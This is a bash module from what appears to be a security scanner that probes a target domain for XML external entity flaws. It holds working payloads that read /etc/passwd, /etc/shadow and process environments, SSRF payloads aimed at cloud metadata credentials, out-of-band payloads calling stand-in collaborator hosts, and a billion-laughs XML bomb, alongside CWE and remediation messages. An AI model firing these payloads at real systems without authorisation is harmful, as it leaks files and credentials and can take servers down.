#!/usr/bin/env bash

source "$(dirname "${BASH_SOURCE[0]}")/../lib/logger.sh"
source "$(dirname "${BASH_SOURCE[0]}")/../lib/utils.sh"

# XXE vulnerability counters (contribute to shared VULNS array if declared)
XXE_VULN_COUNT=0

# ─── XXE Main Entry ─────────────────────────────────────────────────────────

scan_xxe() {
    local domain=$1
    echo "=== XXE (XML External Entities) DETECTION ==="
    log_info "Starting XXE detection on $domain"

    xxe_basic_injection "$domain"
    xxe_file_disclosure "$domain"
    xxe_ssrf "$domain"
    xxe_blind "$domain"
    xxe_xml_bomb "$domain"

    echo "XXE checks completed. Potential findings: $XXE_VULN_COUNT"
    echo ""
}

# ─── Basic XXE Payload Injection ────────────────────────────────────────────

xxe_basic_injection() {
    local domain=$1
    echo "--- Basic XXE Payload Injection ---"

    local xml_endpoints=(
        "https://$domain/api/xml"
        "https://$domain/api/upload"
        "https://$domain/api/v1/xml"
        "https://$domain/upload"
        "https://$domain/import"
        "https://$domain/parse"
    )

    local xxe_payload='<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE test [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root><data>&xxe;</data></root>'

    for url in "${xml_endpoints[@]}"; do
        local status
        status=$(get_http_status "$url")
        if [[ "$status" =~ ^[2-4][0-9]{2}$ && "$status" != "404" ]]; then
            local response
            response=$(curl -s -m 10 -X POST "$url" \
                -H "Content-Type: application/xml" \
                -H "User-Agent: AWJUNAID/2.0" \
                -d "$xxe_payload" 2>/dev/null || true)

            if echo "$response" | grep -qE "root:x:|nobody:|daemon:"; then
                echo "⚠️  [CRITICAL] XXE File Disclosure confirmed: $url"
                echo "    CWE-611 | CVSS: 9.1 (Critical)"
                echo "    Remediation: Disable external entity processing in XML parser"
                ((XXE_VULN_COUNT++))
            elif echo "$response" | grep -qiE "xml|entity|parse error"; then
                echo "ℹ️  XML endpoint detected (further testing warranted): $url"
            fi
        fi
    done
    echo ""
}

# ─── XXE File Disclosure ─────────────────────────────────────────────────────

xxe_file_disclosure() {
    local domain=$1
    echo "--- XXE File Disclosure Attempts ---"

    local disclosure_targets=(
        "file:///etc/passwd"
        "file:///etc/hosts"
        "file:///etc/shadow"
        "file:///proc/self/environ"
        "file:///proc/version"
        "file:///windows/win.ini"
    )

    local xml_endpoints=(
        "https://$domain/api/xml"
        "https://$domain/api/upload"
        "https://$domain/parse"
    )

    for target_file in "${disclosure_targets[@]}"; do
        local payload="<?xml version=\"1.0\"?><!DOCTYPE data [<!ENTITY file SYSTEM \"${target_file}\">]><root>&file;</root>"

        for url in "${xml_endpoints[@]}"; do
            local response
            response=$(curl -s -m 10 -X POST "$url" \
                -H "Content-Type: application/xml" \
                -H "User-Agent: AWJUNAID/2.0" \
                -d "$payload" 2>/dev/null || true)

            if echo "$response" | grep -qE "root:x:|localhost|127\.0\.0\.1|PROCESSOR_IDENTIFIER"; then
                echo "⚠️  [CRITICAL] File disclosure via XXE at $url"
                echo "    Target file: $target_file"
                echo "    CWE-611 | CVSS: 9.1 (Critical)"
                ((XXE_VULN_COUNT++))
            fi
        done
    done
    echo ""
}

# ─── SSRF via XXE ────────────────────────────────────────────────────────────

xxe_ssrf() {
    local domain=$1
    echo "--- SSRF via XXE ---"

    local ssrf_targets=(
        "http://169.254.169.254/latest/meta-data/"
        "http://169.254.170.2/v2/credentials"
        "http://metadata.google.internal/computeMetadata/v1/"
        "http://100.100.100.200/latest/meta-data/"
        "http://localhost:80/"
        "http://127.0.0.1:22/"
    )

    local xml_endpoints=(
        "https://$domain/api/xml"
        "https://$domain/api/upload"
        "https://$domain/parse"
    )

    for ssrf_url in "${ssrf_targets[@]}"; do
        local payload="<?xml version=\"1.0\"?><!DOCTYPE ssrf [<!ENTITY ssrf SYSTEM \"${ssrf_url}\">]><root>&ssrf;</root>"

        for url in "${xml_endpoints[@]}"; do
            local response
            response=$(curl -s -m 10 -X POST "$url" \
                -H "Content-Type: application/xml" \
                -H "User-Agent: AWJUNAID/2.0" \
                -d "$payload" 2>/dev/null || true)

            if echo "$response" | grep -qE "ami-id|instance-id|computeMetadata|iam/security"; then
                echo "⚠️  [CRITICAL] SSRF via XXE - Cloud metadata exposure: $url"
                echo "    SSRF target: $ssrf_url"
                echo "    CWE-918 | CVSS: 9.8 (Critical)"
                ((XXE_VULN_COUNT++))
            fi
        done
    done
    echo ""
}

# ─── Blind XXE Detection ─────────────────────────────────────────────────────

xxe_blind() {
    local domain=$1
    echo "--- Blind XXE Detection ---"

    # Blind XXE uses out-of-band channels; here we test for error-based clues
    local oob_payloads=(
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://burpcollaborator.example.com/blind">%xxe;]><foo/>'
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "https://blind-xxe-test.example.com/ping">]><foo>&xxe;</foo>'
    )

    local xml_endpoints=(
        "https://$domain/api/xml"
        "https://$domain/api/upload"
        "https://$domain/parse"
    )

    for payload in "${oob_payloads[@]}"; do
        for url in "${xml_endpoints[@]}"; do
            local http_code
            http_code=$(curl -s -o /dev/null -w "%{http_code}" -m 10 \
                -X POST "$url" \
                -H "Content-Type: application/xml" \
                -H "User-Agent: AWJUNAID/2.0" \
                -d "$payload" 2>/dev/null || echo "000")

            if [[ "$http_code" =~ ^[2-5][0-9]{2}$ ]]; then
                echo "ℹ️  [INFO] Blind XXE payload sent to $url (HTTP $http_code)"
                echo "    Verify OOB interaction in your collaborator instance"
                echo "    CWE-611 | Severity: High (if OOB confirmed)"
            fi
        done
    done
    echo ""
}

# ─── XML Bomb (Billion Laughs) Protection Test ───────────────────────────────

xxe_xml_bomb() {
    local domain=$1
    echo "--- XML Bomb (Billion Laughs) Protection Test ---"

    local xml_bomb='<?xml version="1.0"?>
<!DOCTYPE lolz [
  <!ENTITY lol "lol">
  <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
  <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
]>
<root>&lol4;</root>'

    local xml_endpoints=(
        "https://$domain/api/xml"
        "https://$domain/api/upload"
        "https://$domain/parse"
    )

    for url in "${xml_endpoints[@]}"; do
        local status
        status=$(get_http_status "$url")
        if [[ "$status" =~ ^[2-4][0-9]{2}$ && "$status" != "404" ]]; then
            local start_time end_time elapsed
            start_time=$(date +%s%N)
            curl -s -m 5 -X POST "$url" \
                -H "Content-Type: application/xml" \
                -H "User-Agent: AWJUNAID/2.0" \
                -d "$xml_bomb" > /dev/null 2>&1 || true
            end_time=$(date +%s%N)
            elapsed=$(( (end_time - start_time) / 1000000 ))

            if [[ $elapsed -gt 4000 ]]; then
                echo "⚠️  [HIGH] Possible XML bomb vulnerability (slow response ${elapsed}ms): $url"
                echo "    CWE-776 | CVSS: 7.5 (High)"
                echo "    Remediation: Limit entity expansion depth/count in XML parser"
                ((XXE_VULN_COUNT++))
            else
                echo "✓  XML bomb protection appears present: $url (${elapsed}ms)"
            fi
        fi
    done
    echo ""
}
